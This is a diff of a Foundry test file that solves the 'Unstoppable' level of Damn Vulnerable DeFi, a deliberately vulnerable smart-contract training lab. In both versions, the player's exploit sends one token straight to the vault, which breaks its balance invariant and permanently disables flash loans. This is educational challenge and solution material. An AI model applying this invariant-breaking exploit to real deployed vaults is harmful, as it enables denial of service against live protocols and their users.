@@ -1,75 +1,86 @@
-//SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
 
-pragma solidity ^0.8.24;
-
+import "forge-std/Test.sol";
+import "../Util.sol";
 import {UnstoppableVault} from "../../src/unstoppable/UnstoppableVault.sol";
 import {ReceiverUnstoppable} from "../../src/unstoppable/ReceiverUnstoppable.sol";
-import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {Test, console} from "../../lib/forge-std/src/Test.sol";
-import {stdError} from "forge-std/Test.sol";
-import {StdUtils} from "../../lib/forge-std/src/StdUtils.sol";
-import {ERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
-import {IERC3156FlashBorrower, IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
+import {ERC20} from "solmate/src/tokens/ERC4626.sol";
 
-contract breakUnstoppable is Test {
-    uint256 public constant TOKEN_SUPPLY = 1_000_000e18;
-    uint256 public constant ATTACKER_WALLET = 10e18;
-    uint256 public constant BORROW_AMOUNT = 100e18;
-    UnstoppableVault vault;
-    DamnValuableToken dvt;
-    ReceiverUnstoppable receiverUnstoppable;
+contract UnstoppableTest is Test {
+    uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
+    uint256 internal constant INITIAL_PLAYER_TOKEN_BALANCE = 100e18;
 
-    address owner = makeAddr("owner");
-    //e the person reaps the rewards for depositing in the vault
-    address feeRecipient = makeAddr("feeRecipient");
-    address attacker = makeAddr("attacker");
-    address user = makeAddr("user");
+    Util internal util;
+
+    UnstoppableVault public vault;
+    DamnValuableToken public token;
+    ReceiverUnstoppable public receiverUnstoppable;
+
+    address payable internal deployer;
+    address payable internal player;
+    address payable internal someUser;
 
     function setUp() public {
-        vm.prank(owner);
+        // create user address
+        util = new Util();
+        address payable[] memory users = util.createUsers(3);
+        deployer = users[0];
+        player = users[1];
+        someUser = users[2];
+
+        // deploy token and vault contract
+        token = new DamnValuableToken();
+        vault = new UnstoppableVault(ERC20(token), deployer, deployer);
+
+        // vm label
+        vm.label(address(token), "DVT Token");
+        vm.label(address(vault), "UnstoppableVault");
+
+        vm.label(address(deployer), "deployer");
+        vm.label(address(player), "player");
+        vm.label(address(someUser), "someUser");
+
+        // transfer token to vault
+        token.approve(address(vault), TOKENS_IN_VAULT);
+        vault.deposit(TOKENS_IN_VAULT, deployer);
+
+        // assert
+        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
+        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
+        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
+        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
+        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1e18), 0);
+        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50_000e18);
+
+        // transfer token to player
+        token.transfer(address(player), INITIAL_PLAYER_TOKEN_BALANCE);
+        assertEq(
+            token.balanceOf(address(player)),
+            INITIAL_PLAYER_TOKEN_BALANCE
+        );
+
+        // possible to execute flashloan
+        vm.startPrank(someUser);
         receiverUnstoppable = new ReceiverUnstoppable(address(vault));
-        dvt = new DamnValuableToken();
-        vault = new UnstoppableVault(
-            dvt,
-            address(owner),
-            address(feeRecipient)
-        );
-
-        //approve the tokens with vault address
-        dvt.approve(address(vault), TOKEN_SUPPLY);
-        //deposit the tokens to vault address as the fee recipient
-        dvt.transfer(address(vault), TOKEN_SUPPLY);
-        //The vault has 1 million tokens now
+        receiverUnstoppable.executeFlashLoan(100e18);
+        vm.stopPrank();
     }
 
-    function testConfig() public {
-        console.log("Balance of vault : ", dvt.balanceOf(address(vault)));
-        assertEq(dvt.balanceOf(address(vault)), TOKEN_SUPPLY);
-    }
-
-    //dangerous equation in contract
-    //attacker sends a small amount of eth to the contract increasing the total supply
-    //Causing an exploit
-
-    function testExploit() public {
-        //Arrange
-        dvt.transfer(attacker, ATTACKER_WALLET);
-        vm.startPrank(attacker);
-        dvt.transfer(address(vault), 1);
-
-        //Act/Assert
-        vm.expectRevert("InvalidBalance");
+    function testUnstoppableExploit() public {
+        /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        token.transfer(address(vault), 1);
+        vm.stopPrank();
+        /* */
+        vm.expectRevert();
         validation();
-        console.log(
-            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
-        );
     }
 
     function validation() internal {
-        // It is no longer possible to execute flash loans
-        vm.startPrank(owner);
-        receiverUnstoppable.executeFlashLoan(10);
+        vm.startPrank(someUser);
+        receiverUnstoppable.executeFlashLoan(100e18);
         vm.stopPrank();
     }
 }
